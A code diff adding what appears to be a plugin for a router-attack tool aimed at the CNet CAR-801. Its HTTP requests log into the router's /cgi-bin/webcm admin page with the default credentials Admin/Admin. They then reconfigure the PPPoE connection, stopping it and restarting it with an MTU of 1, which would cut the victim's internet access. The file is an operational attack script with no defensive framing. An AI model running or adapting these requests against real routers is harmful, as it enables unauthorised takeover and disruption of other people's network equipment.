@@ -1,0 +1,29 @@
+"""
+CAR-801
+"""
+
+vendor = 'CNet'
+name = 'CAR-801'
+regex = r'(?s).*(CNet).*'
+
+# step #1
+get('http://{routerip}/?')
+
+# step #2
+data = 'var%3Amain=menu&var%3Astyle=style5&getpage=%2Fusr%2Fwww_safe%2Fhtml%2Fdefs%2Fstyle5%2Fmenus%2Fmenu.html&errorpage=%2Fusr%2Fwww_safe%2Fhtml%2Findex.html&var%3Apagename=home&var%3Aerrorpagename=home&var%3Amenu=home&var%3Amenutitle=Home&var%3Apagetitle=Home&var%3Apagemaster=home&login%3Acommand%2Fusername=Admin&login%3Acommand%2Fpassword=Admin'
+post('http://{routerip}/cgi-bin/webcm', data=data)
+
+# step #3
+get('http://{routerip}/cgi-bin/webcm?getpage=%2Fusr%2Fwww_safe%2Fhtml%2Fdefs%2Fstyle5/menus%2Fmenu.html&var:style=style5&var:main=menu&var:pagename=home&var:pagetitle=Home&var:menu=setup&var:menutitle=Setup')
+
+# step #4
+get('http://{routerip}/cgi-bin/webcm?getpage=%2Fusr%2Fwww_safe%2Fhtml%2Fdefs%2Fstyle5%2Fmenus%2Fmenu.html&var:style=style5&var:main=menu&var:menu=setup&var:menutitle=Setup&var:pagename=pppoe&var:pagetitle=gnet%20Setup&var:conid=connection1&var:muxid=mux1&var:encapsid=encaps1&var:langrp=lan0')
+
+# step #5
+data = 'var%3Amain=menu&var%3Astyle=style5&getpage=%2Fusr%2Fwww_safe%2Fhtml%2Fdefs%2Fstyle5%2Fmenus%2Fmenu.html&errorpage=%2Fusr%2Fwww_safe%2Fhtml%2Fdefs%2Fstyle5%2Fmenus%2Fmenu.html&var%3Apagename=pppoe&var%3Aerrorpagename=&var%3Amenu=setup&var%3Amenutitle=Setup&var%3Apagetitle=gnet+Setup&var%3Apagemaster=&connection1%3Asettings%2Ftype=pppoe&connection1%3Apppoe%3Asettings%2Fmtu=1&connection1%3Apppoe%3Acommand%2Fstop=&logger%3Asettings%2Floglevel=notice&logger%3Asettings%2Ffacility%2Fuser=notice&var%3Aconid=connection1&var%3Amuxid=mux1&var%3Aencapsid=encaps1'
+post('http://{routerip}/cgi-bin/webcm', data=data)
+
+# step #6
+data = 'var%3Amain=menu&var%3Astyle=style5&getpage=%2Fusr%2Fwww_safe%2Fhtml%2Fdefs%2Fstyle5%2Fmenus%2Fmenu.html&errorpage=%2Fusr%2Fwww_safe%2Fhtml%2Fdefs%2Fstyle5%2Fmenus%2Fmenu.html&var%3Apagename=pppoe&var%3Aerrorpagename=&var%3Amenu=setup&var%3Amenutitle=Setup&var%3Apagetitle=gnet+Setup&var%3Apagemaster=&connection1%3Asettings%2Ftype=pppoe&connection1%3Apppoe%3Asettings%2Fmtu=1&connection1%3Apppoe%3Acommand%2Fstart=&logger%3Asettings%2Floglevel=notice&logger%3Asettings%2Ffacility%2Fuser=notice&connection1%3Asettings%2Fdescription=gnet&fdb%3Asettings%2Fservice%2Fstate=1&connection1%3Afwan%3Asettings%2Fprivate%2Fnat%2Fstate=1&connection1%3Afwan%3Asettings%2Fprivate%2Fspi%2Fstate=1&var%3Aconid=connection1&var%3Amuxid=mux1&var%3Aencapsid=encaps1'
+post('http://{routerip}/cgi-bin/webcm', data=data)
+
